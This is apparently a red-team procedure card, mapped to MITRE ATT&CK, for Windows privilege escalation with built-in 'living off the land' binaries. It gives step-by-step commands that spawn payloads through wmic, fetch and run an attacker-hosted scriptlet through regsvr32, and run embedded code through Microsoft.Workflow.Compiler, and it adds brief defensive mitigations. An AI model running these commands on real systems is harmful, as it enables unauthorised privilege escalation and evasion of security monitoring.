---
id: 6dab44c0-27f0-4e4d-948d-7f3208517d35
name: Windows-EoP-with-Living-Off-The-Land-Binaries-and-Scripts
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:30.072431+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Indirect Command Execution|T1202 - Indirect Command Execution]]'
sub_techniques: []
tags:
  - eop
  - lolbins
  - windows-privilege-escalation
commands:
  - '[[commands/wmic-process-call-create]]'
  - '[[commands/regsvr32-execute-remote-sct]]'
  - '[[commands/microsoft-workflow-compiler-execute-workflow]]'
platforms:
  - Windows
tools: []
validated: true
---

# Windows-EoP-with-Living-Off-The-Land-Binaries-and-Scripts

## Summary

This procedure demonstrates privilege escalation on Windows systems using Living Off The Land Binaries (LOLBins) and Scripts (LOLScripts), leveraging built-in system tools like WMIC, Regsvr32, and Microsoft.Workflow.Compiler to execute malicious code indirectly. This approach evades detection by avoiding custom binaries and relies on legitimate utilities to download, register, or compile payloads that can create privileged processes or access sensitive resources.

## Description

In a privilege escalation scenario, an attacker with initial low-privileged access on a Windows system can use LOLBins to execute code that bypasses restrictions and gains higher privileges, such as SYSTEM or Administrator. Tools like WMIC allow process creation, Regsvr32 can fetch and execute remote scripts via DLL registration, and Microsoft.Workflow.Compiler can process XML workflows containing embedded code. This technique is particularly effective in environments with endpoint detection relying on signature-based blacklisting, as these are native Windows components. The procedure assumes the attacker has command-line access (e.g., via initial foothold) and targets unpatched or misconfigured systems where these tools are unrestricted. Successful execution leads to elevated shells or persistent access, enabling further lateral movement or data exfiltration.

## Requirements

1. Low-privileged shell access on a Windows target (e.g., user-level CMD or PowerShell session).
2. Network connectivity to a controlled server hosting payloads (for remote fetches).
3. Knowledge of target system binaries and potential restrictions (e.g., no AppLocker blocking).
4. Pre-staged payload files, such as SCT scripts or XML workflows, on an attacker-controlled server.

## Defense

- Implement application whitelisting (e.g., AppLocker or WDAC) to restrict execution of LOLBins in non-standard contexts.
- Monitor command-line arguments for anomalous usage of WMIC, Regsvr32, and Microsoft.Workflow.Compiler via Sysmon or EDR tools.
- Enable PowerShell logging and constrained language mode to limit script execution.
- Network segmentation and proxy inspection to block unauthorized downloads via HTTP/HTTPS.

## Objectives

1. Execute arbitrary code using native Windows binaries to achieve privilege escalation.
2. Evade detection by leveraging trusted system tools for payload delivery and execution.
3. Gain elevated access to sensitive system resources or create persistent backdoors.

## Instructions

### Step 1: Create a New Process Using WMIC

**Context**: Use WMIC to spawn a new process, replacing a benign executable like calc.exe with a privilege-escalating payload (e.g., a script that exploits a local vulnerability or runs as SYSTEM). This step demonstrates indirect execution to test or initiate escalation.

**Command** ([[commands/wmic-process-call-create]]):
```cmd
wmic.exe process call create "$_PAYLOAD_PATH"
```

> This command creates a new process with the specified payload. Replace $_PAYLOAD_PATH with the path to an executable or script that performs escalation (e.g., a custom batch file exploiting unquoted service paths). Expected output includes process creation confirmation; verify escalation by checking the new process's privileges with tools like whoami /priv.

### Step 2: Execute Remote Script via Regsvr32

**Context**: Fetch and execute a remote SCT (Scriptlet) file using Regsvr32, which registers it as a DLL and triggers code execution. This is useful for downloading and running escalation scripts without direct file writes, assuming the target can reach the attacker's server.

**Command** ([[commands/regsvr32-execute-remote-sct]]):
```cmd
regsvr32 /s /n /u /i:$_REMOTE_URL scrobj.dll
```

> The flags ensure silent, non-registering execution of the URL-specified script. $_REMOTE_URL points to an attacker-hosted SCT file containing escalation code (e.g., adding a privileged user). Success is indicated by no errors and evidence of the script's effects, such as new registry entries or processes.

### Step 3: Compile and Execute Workflow with Microsoft.Workflow.Compiler

**Context**: Use Microsoft.Workflow.Compiler to process a malicious XML workflow file that embeds executable code, allowing indirect execution for escalation tasks like modifying services or injecting into privileged processes.

**Command** ([[commands/microsoft-workflow-compiler-execute-workflow]]):
```cmd
Microsoft.Workflow.Compiler.exe $_INPUT_XML $_OUTPUT_XML
```

> $_INPUT_XML is the path to a locally placed or downloaded XML file with embedded escalation logic, and $_OUTPUT_XML is the result file (often irrelevant). Monitor for compilation success and check for side effects like elevated file access or new scheduled tasks.
